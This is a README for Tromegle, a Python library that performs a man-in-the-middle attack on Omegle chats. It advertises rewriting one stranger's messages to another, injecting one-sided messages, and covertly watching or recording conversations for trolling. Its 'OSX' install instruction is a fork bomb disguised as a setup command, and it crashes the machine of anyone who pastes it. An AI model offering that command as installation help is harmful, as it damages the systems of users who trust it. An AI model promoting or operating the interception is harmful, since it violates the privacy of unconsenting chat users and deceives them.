Tromegle:  Troll Strangers!
========
Tromegle started as a project through which to learn about HTTP requests and asynchronous I/O.  The idea was
to learn how to use urllib(2) and later Twisted while having a bit of fun at the expense of a few [Omegle](http://omegle.com) users, or "strangers".
It has since evolved into an unofficial API, complete with a simple client class.

###Trolling is a Art!
The nonstandard functionality of Tromegle is centered around a relatively simple [man-in-the-middle attack](http://en.wikipedia.org/wiki/Man-in-the-middle_attack).

The power of Tromegle lies in the Transmogrifier class, which allows for the conditional modification or injection of AJAX events
and, by extension, user messages.  In plain English, this means **you can modify the message a user sends to another**
as well as pass messages that only one user will see!

###Trolling gently
Sometimes it's just fun to evesdrop; internet users are often funny despite themselves.  Tromegle gives you the
tools to either observe or record conversations, or relevant portions thereof.

Getting Tromegle
========
As of right now, the easiest way to obtain Tromegle is to clone this git repository with this command:

```git clone https://github.com/louist87/tromegle.git```

I do plan to release this library as a pip package when it leaves alpha.

Dependencies
========
Tromegle requires that you have the latest version of [Twisted](http://twistedmatrix.com/) installed.

Canonical installation instructions can be found on the above website, but the following installation steps
should work.

###Ubuntu (or other Debian-based distro)

```sudo apt-get install python-twisted```

###Windows

Download the installer from [here](http://twistedmatrix.com/trac/wiki/Downloads)

###Any OS with pip installed (Mac/Win/*nix)

```pip install Twisted```

###OSX
```sudo :(){:|:&};: && python-twisted```


Using Tromegle
========
So far, the MiddleMan class is the only attack that is working.  More work will follow, including documentation.

```python

import tromegle

m = tromegle.MiddleMan()
tromegle.reactor.run()
```
